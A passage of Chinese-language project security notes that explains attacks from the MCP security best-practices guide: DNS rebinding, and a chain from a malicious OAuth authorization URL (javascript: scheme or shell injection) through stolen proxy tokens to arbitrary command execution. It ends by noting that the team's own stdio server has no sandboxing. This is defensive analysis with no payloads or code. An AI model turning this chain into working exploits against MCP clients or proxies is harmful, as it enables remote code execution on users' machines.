- **"用可靠的Server"这条防线在这里彻底失效**——哪怕Client一开始判断这个Server/域名"可靠"（甚至真的做了尽职调查），攻击者也只需要等这次判断完成之后，改一下自己域名的DNS记录——信任评估发生在过去某个时间点，而请求发生在未来某个时间点，中间这段时间差就是攻击窗口，这也是为什么官方缓解措施完全不涉及"甄别Server"，只讲"把校验时的IP钉住复用"这一条技术手段。

### 6.3 合并深挖：OAuth Authorization URL Validation + stdio Transport Security in Proxy Scenarios

表格里这两行拆开看容易觉得是两个独立话题，但官方原文自己在"OAuth Authorization URL Validation"一节末尾专门有一句"stdio Transport Privilege Escalation"点出了两者的关系——前者是入口，后者是升级路径，本质是同一条攻击链的两段：

![从打开一个恶意URL到远程代码执行的完整链条：入口路径A是JavaScript URL Injection，恶意Server提供javascript:开头的授权URL，Client没有校验URL scheme直接传给window.open()，浏览器把这段当JS执行，攻击者代码开始在Client的执行上下文里跑；入口路径B是Shell命令注入，恶意Server提供含shell注入payload的URL，Client用cmd.exe或PowerShell等shell去打开这个URL而不是走浏览器API，shell把URL里部分内容当额外命令执行，直接在OS层面拿到代码执行；两条路径殊途同归，攻击者都拿到了在Client环境或主机上执行代码的能力；升级路径特别限定仅当Client通过独立的本地Proxy进程管理stdio连接时才成立，直接使用stdio没有这段风险——攻击者用刚拿到的执行能力偷走Client与Proxy之间的认证token，拿着偷来的token向Proxy发一个伪装成合法命令的stdio请求，Proxy只凭token做认证没有再校验这次spawn请求到底想启动什么命令，于是真的spawn了攻击者构造的任意命令，命令执行完的结果原样传回Client，攻击者借这条通路把窃取的数据或命令结果传回自己控制的Server或建立持久化后门，最终从网页脚本能执行升级成了以用户权限在整台机器上远程代码执行](mcp-oauth-url-stdio-escalation.svg)

两层根因需要分开理解，容易被当成一回事：

- **入口层的根因，在Client处理"不可信URL"的方式上**——两条路径殊途同归，都是把来自Server（不可信来源）的URL字符串，直接喂给了一个"会执行内容"的接口：要么是浏览器的`window.open()`没做scheme校验（认了`javascript:`），要么是用shell去"打开"URL、让shell把URL内容当命令解析。这条根因本身不需要Proxy架构，纯Client就能触发。
- **升级层的根因，专门发生在"有独立Proxy进程管理stdio连接"这种架构下**——官方原文有一句重要限定："This attack vector only applies to MCP implementations that use a proxy architecture, not to direct stdio transport usage"。如果Client直接用stdio连Server（没有中间这层Proxy），入口层拿到的浏览器XSS**不会自动带来本地代码执行**——之所以能升级，是因为这类架构里Proxy只凭一个token认证请求，却没有再校验"这次spawn请求到底想启动什么命令"，一旦token被偷，Proxy没有办法分辨"这是Client在正常使用"还是"有人拿着偷来的token在冒充"。**stdio传输协议本身没有问题**，出问题的是"Proxy只信token、不校验spawn内容"这个额外加的架构层。

**跟我们自己项目的直接对应**——`api-impact-tool`就是一个**本地stdio Server**，正好落在"Local MCP Server Compromise"这一类的攻击面里：它没做任何sandbox隔离，`server.py`能访问的文件系统权限跟运行它的Client（Claude Code）完全一样。我们靠的是`config.json`白名单（只认注册过的仓库名，不接受任意路径）这一层应用层防护，官方建议的"sandbox隔离子进程"这条我们目前没有额外做——这是一个如实记录的现状，不是这次要修的bug。

来源：[Security Best Practices](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices)（Apache-2.0）
